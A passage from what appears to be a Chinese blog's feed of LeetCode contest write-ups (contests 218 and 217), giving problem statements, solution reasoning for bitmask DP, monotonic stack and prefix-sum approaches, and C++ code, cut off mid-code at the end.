class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>这种类似得状态压缩<code>dp</code>题目已经遇到好多次了，但是本题需要仔细优化以下，否则非常容易超时。</li><li>设置<code>dp[mask]</code>表示状态<code>mask</code>代表得二进制位图的最小兼容性，<code>valid[mask]</code>代表状态<code>mask</code>代表得二进制位图的子数组是否合法，即划分为子集后不能出现重复的元素。</li><li>我们可以预先处理，我们可以求出`每个子集的元素个数为$width = \frac{n}{k}$。</li><li>我们每次对状态<code>mask</code>进行子集枚举，刚好枚举的子集<code>T</code>的元素个数为为$\frac{n}{k}$,集合<code>mask</code>中去掉子集<code>T</code>以外的元素集合为$mask \bigoplus T$，则此时我们可以知道:<script type="math/tex; mode=display">dp[mask] = min(dp[mask],dp[T] + dp[mask \bigoplus T])</script></li><li>进一步优化，我们可以预先处理，求出子集的不兼容性的得分为$score[T]$,同时我们可以提前求出任意的子集和剩余的子集是否合法，从而可以避免重复计算，且我们只计算元素个数能够被<code>width</code>整除的集合。<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">1</span>&lt;&lt;<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">bool</span> valid[<span class="number">1</span>&lt;&lt;<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">checkValid</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; nums,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">17</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> v : nums)&#123;</span><br><span class="line">            cnt[v]++;</span><br><span class="line">            <span class="keyword">if</span>(cnt[v] &gt; k) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minimumIncompatibility</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> w = n/k;</span><br><span class="line">        <span class="keyword">int</span> mask = (<span class="number">1</span>&lt;&lt;n)<span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(dp,INF,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">        <span class="built_in">memset</span>(valid,<span class="literal">false</span>,<span class="keyword">sizeof</span>(valid));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); ++i)&#123;</span><br><span class="line">            arr.clear();</span><br><span class="line">            <span class="keyword">int</span> bitCnt = __builtin_popcount(i);</span><br><span class="line">            <span class="keyword">if</span>(bitCnt%w == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(i&amp;(<span class="number">1</span>&lt;&lt;j)) arr.push_back(nums[j]);</span><br><span class="line">                &#125;</span><br><span class="line">                sort(arr.begin(),arr.end());</span><br><span class="line">                <span class="keyword">if</span>(bitCnt == w) dp[i] = arr.back()-arr[<span class="number">0</span>];</span><br><span class="line">                valid[i] = checkValid(arr,bitCnt/w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!valid[mask]) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        valid[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (<span class="number">1</span>&lt;&lt;n); ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(__builtin_popcount(i)%w != <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j != <span class="number">0</span>; j = (j<span class="number">-1</span>)&amp;i)&#123;</span><br><span class="line">                <span class="keyword">if</span>(__builtin_popcount(j) != w) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(valid[j] &amp;&amp; valid[i^j])&#123;</span><br><span class="line">                    dp[i] = min(dp[i],dp[j] + dp[i^j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> dp[mask];      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-contest-218&quot;&gt;&lt;a href=&quot;#leetcode-contest-218&quot; class=&quot;headerlink&quot; title=&quot;leetcode   contest 218&quot;&gt;&lt;/a&gt;leetcode   contest 218&lt;/h1&gt;&lt;p&gt;本周周赛最后一题果真是惯例题目，只做出来前三道题目，最后一题的状态压缩&lt;code&gt;dp&lt;/code&gt;还是比较有难度的题目，需要进行优化。&lt;/p&gt;&lt;h2 id=&quot;5617-设计-Goal-解析器&quot;&gt;&lt;a href=&quot;#5617-设计-Goal-解析器&quot; class=&quot;headerlink&quot; title=&quot;5617. 设计 Goal 解析器&quot;&gt;&lt;/a&gt;5617. 设计 Goal 解析器&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;请你设计一个可以解释字符串 &lt;code&gt;command&lt;/code&gt;的 &lt;code&gt;Goal&lt;/code&gt; 解析器 。&lt;code&gt;command&lt;/code&gt;由 &lt;code&gt;&amp;quot;G&amp;quot;、&amp;quot;()&amp;quot;&lt;/code&gt;和/或 &lt;code&gt;&amp;quot;(al)&amp;quot;&lt;/code&gt;按某种顺序组成。&lt;code&gt;Goal&lt;/code&gt; 解析器会将 &lt;code&gt;&amp;quot;G&amp;quot;&lt;/code&gt; 解释为字符串&lt;code&gt;&amp;quot;G&amp;quot;、&amp;quot;()&amp;quot;&lt;/code&gt;解释为字符串&lt;code&gt;&amp;quot;o&amp;quot; ，&amp;quot;(al)&amp;quot;&lt;/code&gt;解释为字符串 “al” 。然后，按原顺序将经解释得到的字符串连接成一个字符串。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛 217场</title>
    <link href="http://yoursite.com/2020/11/29/231/"/>
    <id>http://yoursite.com/2020/11/29/231/</id>
    <published>2020-11-29T14:22:31.637Z</published>
    <updated>2020-12-01T04:28:19.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-217"><a href="#leetcode-contest-217" class="headerlink" title="leetcode   contest 217"></a>leetcode   contest 217</h1><p>本周周赛难度果真很大，只做出了前2题，后面2题确实很难，基本上没有什么思路。确实是非常经典的<code>cp</code>题目，偶尔会出现难度很大的题目。</p><h2 id="5613-最富有客户的资产总量"><a href="#5613-最富有客户的资产总量" class="headerlink" title="5613. 最富有客户的资产总量"></a>5613. 最富有客户的资产总量</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给你一个 <code>m x n</code>的整数网格 <code>accounts</code>，其中 <code>accounts[i][j]</code>是第 <code>i​​​​​​​​​​​​</code> 位客户在第 <code>j</code> 家银行托管的资产数量。返回最富有客户所拥有的 资产总量 。</p><a id="more"></a><p>客户的 资产总量 就是他们在各家银行托管的资产数量之和。最富有客户就是 资产总量 最大的客户。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：accounts = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br><span class="line">输出：<span class="number">6</span></span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">1</span> 位客户的资产总量 = <span class="number">1</span> + <span class="number">2</span> + <span class="number">3</span> = <span class="number">6</span></span><br><span class="line">第 <span class="number">2</span> 位客户的资产总量 = <span class="number">3</span> + <span class="number">2</span> + <span class="number">1</span> = <span class="number">6</span></span><br><span class="line">两位客户都是最富有的，资产总量都是 <span class="number">6</span> ，所以返回 <span class="number">6</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输入：accounts = [[<span class="number">1</span>,<span class="number">5</span>],[<span class="number">7</span>,<span class="number">3</span>],[<span class="number">3</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">10</span></span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">1</span> 位客户的资产总量 = <span class="number">6</span></span><br><span class="line">第 <span class="number">2</span> 位客户的资产总量 = <span class="number">10</span> </span><br><span class="line">第 <span class="number">3</span> 位客户的资产总量 = <span class="number">8</span></span><br><span class="line">第 <span class="number">2</span> 位客户是最富有的，资产总量是 <span class="number">10</span></span><br><span class="line">示例 <span class="number">3</span>：</span><br><span class="line"></span><br><span class="line">输入：accounts = [[<span class="number">2</span>,<span class="number">8</span>,<span class="number">7</span>],[<span class="number">7</span>,<span class="number">1</span>,<span class="number">3</span>],[<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>]]</span><br><span class="line">输出：<span class="number">17</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>m == accounts.length</code></li><li><code>n == accounts[i].length</code></li><li><code>1 &lt;= m, n &lt;= 50</code></li><li><code>1 &lt;= accounts[i][j] &lt;= 100</code></li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/richest-customer-wealth" target="_blank" rel="noopener">https://leetcode-cn.com/problems/richest-customer-wealth</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  暴力</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>求矩阵每行的和即可。<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maximumWealth</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; accounts)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> row = accounts.size();</span><br><span class="line">        <span class="keyword">int</span> col = accounts[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; row; ++i)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; col; ++j)&#123;</span><br><span class="line">                sum += accounts[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">            ans = max(ans,sum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5614-找出最具竞争力的子序列"><a href="#5614-找出最具竞争力的子序列" class="headerlink" title="5614. 找出最具竞争力的子序列"></a>5614. 找出最具竞争力的子序列</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums</code>和一个正整数 k ，返回长度为 k 且最具 竞争力 的 <code>nums</code>子序列。</p><p>数组的子序列是从数组中删除一些元素（可能不删除元素）得到的序列。</p><p>在子序列 <code>a</code>和子序列 <code>b</code>第一个不相同的位置上，如果 <code>a</code>中的数字小于 b 中对应的数字，那么我们称子序列 <code>a</code> 比子序列 <code>b</code>（相同长度下）更具 竞争力 。 例如，<code>[1,3,4]</code>比 <code>[1,3,5]</code>更具竞争力，在第一个不相同的位置，也就是最后一个位置上， <code>4</code>小于<code>5</code> 。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">6</span>], k = <span class="number">2</span></span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">6</span>]</span><br><span class="line">解释：在所有可能的子序列集合 &#123;[<span class="number">3</span>,<span class="number">5</span>], [<span class="number">3</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">6</span>], [<span class="number">5</span>,<span class="number">2</span>], [<span class="number">5</span>,<span class="number">6</span>], [<span class="number">2</span>,<span class="number">6</span>]&#125; 中，[<span class="number">2</span>,<span class="number">6</span>] 最具竞争力。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>], k = <span class="number">4</span></span><br><span class="line">输出：[<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>0 &lt;= nums[i] &lt;= 109</code></li><li><code>1 &lt;= k &lt;= nums.length</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/find-the-most-competitive-subsequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-the-most-competitive-subsequence</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 贪心算法</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>本质为贪心算法，将尽可能小的数往目标数列中添加，并且尽可能的将最小的元素添加在目标数列的前面，并满足最终的数列的长度为<code>k</code>。<br>假设当前的目标数为<code>nums[i]</code>,当前已经选中的数列为<code>target</code>, 则我们需要将<code>num[i]</code>与<code>target[j]</code>进行替换，并且删除索引为<code>[j+1,k-1]</code>的元素。我们假设已经知道<code>nums[i]</code> &gt; <code>target[j]</code>，则此时我们可以知道如下：<script type="math/tex; mode=display">arr1 = (target[0],target[1],...target[j],target[j+1],...,target[k-1]) \\arr2 = (target[0],target[1],...,nums[i],....)</script>我们知道如果满足$nums[i] &gt; target[j]$时，<code>arr2</code>的竞争力一定比<code>arr1</code>的竞争力强，所以我们应找到最小的<code>j</code>,满足：<script type="math/tex; mode=display">nums[i] > target[t]]_{t=j}^{k-1}</script>如果我们能够将<code>nums[i]</code>替换<code>target[j]</code>且<code>[i+1,n-1]</code>的元素的个数加上<code>j+1</code>应该满足大于等于<code>k</code>,否则就无法满足<code>k</code>个元素的长度要求，因此我们在实际判断时需要判断<code>n-i + ans.size() &gt; k</code>。</li><li>优先级队列，我们每次直接筛选最小值，然后维护窗口右移即可。时间复杂度为$O(n\lg{n})$,算法也非常经典。筛选出最小的<code>k</code>个数即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>单调栈<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; mostCompetitive(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">            <span class="keyword">while</span>(!ans.empty() &amp;&amp; ans.back() &gt; nums[i] &amp;&amp; n-i + ans.size() &gt; k) ans.pop_back();</span><br><span class="line">            <span class="keyword">if</span>(ans.size() &lt; k) ans.push_back(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>优先级队列<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; mostCompetitive(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, <span class="built_in">vector</span>&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;, greater&lt;&gt;&gt; pq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - k + <span class="number">1</span>; ++i)</span><br><span class="line">            pq.emplace(nums[i], i);</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">            <span class="keyword">while</span> (pq.top().second &lt; l)</span><br><span class="line">                pq.pop();</span><br><span class="line">            <span class="keyword">auto</span> [num, idx] = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            l = idx + <span class="number">1</span>;</span><br><span class="line">            ans.emplace_back(num);</span><br><span class="line">            <span class="keyword">if</span> (i &lt; k - <span class="number">1</span>)</span><br><span class="line">                pq.emplace(nums[n - k + i + <span class="number">1</span>], n - k + i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5615-使数组互补的最少操作次数"><a href="#5615-使数组互补的最少操作次数" class="headerlink" title="5615. 使数组互补的最少操作次数"></a>5615. 使数组互补的最少操作次数</h2><p>给你一个长度为 偶数 n 的整数数组 <code>nums</code> 和一个整数 <code>limit</code>。每一次操作，你可以将 <code>nums</code> 中的任何整数替换为 1 到 limit 之间的另一个整数。</p><p>如果对于所有下标 i（下标从 0 开始），<code>nums[i] + nums[n - 1 - i]</code> 都等于同一个数，则数组 <code>nums</code> 是 互补的 。例如，数组 <code>[1,2,3,4]</code> 是互补的，因为对于所有下标<code>i ，nums[i] + nums[n - 1 - i] = 5</code>。</p><p>返回使数组 互补 的 最少 操作次数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>], limit = <span class="number">4</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：经过 <span class="number">1</span> 次操作，你可以将数组 nums 变成 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>]（加粗元素是变更的数字）：</span><br><span class="line">nums[<span class="number">0</span>] + nums[<span class="number">3</span>] = <span class="number">1</span> + <span class="number">3</span> = <span class="number">4.</span></span><br><span class="line">nums[<span class="number">1</span>] + nums[<span class="number">2</span>] = <span class="number">2</span> + <span class="number">2</span> = <span class="number">4.</span></span><br><span class="line">nums[<span class="number">2</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">2</span> = <span class="number">4.</span></span><br><span class="line">nums[<span class="number">3</span>] + nums[<span class="number">0</span>] = <span class="number">3</span> + <span class="number">1</span> = <span class="number">4.</span></span><br><span class="line">对于每个 i ，nums[i] + nums[n<span class="number">-1</span>-i] = <span class="number">4</span> ，所以 nums 是互补的。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>], limit = <span class="number">2</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：经过 <span class="number">2</span> 次操作，你可以将数组 nums 变成 [<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>] 。你不能将任何数字变更为 <span class="number">3</span> ，因为 <span class="number">3</span> &gt; limit 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>], limit = <span class="number">2</span></span><br><span class="line">输出：<span class="number">0</span></span><br><span class="line">解释：nums 已经是互补的。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>n == nums.length</code></li><li><code>2 &lt;= n &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= limit &lt;= 105</code></li><li><code>n</code> 是偶数。</li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/minimum-moves-to-make-array-complementary" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-moves-to-make-array-complementary</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 二分查找或者查分数组。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>首先我们知道肯定是将数组中所有互补的元素的和最终都变为一个确定的值<code>t</code>.这是建设互补的元素为$(a,b)$,且满足$(a \le b)$,则有以下四种情况：</li></ol><ul><li>$a\ge t$: 此时我们需要将<code>a,b</code>都变为比<code>t</code>小的数，则此时需要替换的步数为<code>2</code>.</li><li>$b &lt; (t-limit)$ : 则此时我们需要将<code>a,b</code>都需要变换才能保证<code>a + b = t</code>,则此时需要变换的次数为<code>2</code>.</li><li>$a + b = t$: 此时不需要变换，则变换步数为<code>0</code>.</li><li>$ a &lt; t, b \ge (t-limit), a + b \neq t$: 则此时我们可以任意变换<code>a</code>或者<code>b</code>均可满足要求，则需要变换一次。</li></ul><ol><li>知道以上情况后，我们只需要枚举所有的目标值<code>t</code>,<code>t</code>可能的取值范围为$[2,2<em>limit]$，枚举所有的<code>t</code>然后求出最小的变换步数即可，当然如果直接求的话，时间复杂度为$O(2</em>limit*n)$,显然如果直接求的话，肯定会超时的，我们必须要转换思路。</li><li>二分查找：我们最先想到的即为二分查找，每次枚举<code>i</code>,我们将数组种互补的元素中较小的元素全部取出，然后进行排序，利用二分查找，找到大于等于<code>i</code>的元素有<code>upper</code>个;我们将数组种互补的元素中较大的元素全部取出，然后进行排序，利用二分查找，找到小于<code>i-limit</code>的元素有<code>lower</code>个.剩余的元素即为第三种和第四种情况的元素的个数的总和$n-upper-lower$，我们其中减去互补元素对的和为<code>i</code>的个数，即得到只需要变换一次的元素的个数$n-upper-lower-tot[i]$，总的时间复杂度为$O(2<em>limit</em>2*\lg{\frac{n}{2}})$。所以总的变换步数应该为:<script type="math/tex; mode=display">move = upper*2 + lower*2 + (n/2-upper-lower-tot[i]) \\= upper + lower + n/2 - tot[i]</script></li><li>前缀和：原理与二分查找类似，只不过我们可以提前求出前缀和，避免二分查找。我们用$lo[i]$表示互补数对中较小的元素序列中比<code>i</code>大的元素有多少个，用<code>hi[i]</code>表示互补数对中较大的元素序列中比<code>i</code>小的元素有多少个。这样我们通过前缀和的提前处理，可以在在枚举时$O(1)$的时间复杂度内求出变换步数，用该算法总的时间复杂度为$O(n)$,空间复杂度为$O(4*limit)$.</li><li>差分数组:后来看了解答还有更加巧妙的查分数组的解法，这个解法确实不容易想出来。<a href="https://leetcode-cn.com/problems/minimum-moves-to-make-array-complementary/solution/chai-fen-sao-miao-by-lucifer1004/" target="_blank" rel="noopener">差分数组</a><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>二分查找:<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 